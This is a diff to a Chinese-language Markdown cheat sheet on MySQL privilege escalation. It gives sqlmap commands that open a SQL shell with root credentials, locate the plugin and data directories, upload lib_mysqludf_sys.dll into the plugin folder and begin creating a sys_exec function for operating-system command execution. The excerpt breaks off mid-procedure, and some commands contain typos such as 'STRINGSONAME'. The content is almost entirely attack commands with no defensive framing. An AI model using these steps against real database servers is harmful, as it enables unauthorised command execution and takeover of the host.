@@ -2,19 +2,25 @@
 ## mysql提权
 
 (1）连接mysql数据打开一个交互shell:
-```
+```sql
 sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --sql-shell
 
 select @@version;
 
 select @@plugin_dir;
 
-d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\
-```
-(2）利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:
+select @@basedir;   //查找mysql的目录
+
+select @@datadir 路径
+
 
 ```
-sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll
+(2）利用sqlmap上传`lib_mysqludf_sys`到MySQL插件目录:
+
+```python
+sqlmap.py -d mysql://root:root@127.0.0.1:3306/test 
+--file-write=lib_mysqludf_sys.dll
+--file-dest=plugin插件地址
 
 CREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'
 
